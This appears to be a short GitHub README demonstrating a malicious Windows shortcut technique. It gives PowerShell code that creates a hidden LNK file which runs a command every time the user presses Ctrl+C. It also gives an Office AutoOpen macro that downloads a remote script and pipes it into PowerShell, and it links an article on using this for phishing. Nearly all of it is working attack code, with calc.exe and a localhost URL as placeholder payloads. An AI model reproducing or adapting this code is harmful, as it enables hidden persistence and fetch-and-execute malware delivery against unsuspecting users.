# Malicious LNK File Hotkey
 Crafting a malicious LNK file with ctrl+c hotkey & execute it everytimes typing ctrl+c hotkey

## For more details about Malicious LNK File creation, check out my medium article
https://bryanleong98.medium.com/utilizing-windows-lnk-features-for-phishing-with-macro-malware-eefc7ec52120


## Malicious LNK File Creation (Powershell)
'''
$malLoc = $home + "\Desktop\mal.lnk"

$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($malLoc)
$Shortcut.TargetPath = 'C:\Windows\System32\cmd.exe'
$Shortcut.Arguments = '/c calc.exe'
$Shortcut.hotkey = 'CTRL+C'
$Shortcut.WindowStyle = 7 
$Shortcut.Save()

attrib +h $malLoc
'''

## Office VBScript 
Macro Name: AutoOpen

'''
Sub AutoOpen()
    Shell ("powershell /c ""(Invoke-WebRequest ""http://127.0.0.1:8080/mal.txt"").Content | powershell"" ")
End Sub
'''

## Useful links to refer to
https://docs.microsoft.com/en-us/office/vba/word/concepts/customizing-word/auto-macros

https://docs.microsoft.com/en-us/troubleshoot/windows-client/admin-development/create-desktop-shortcut-with-wsh
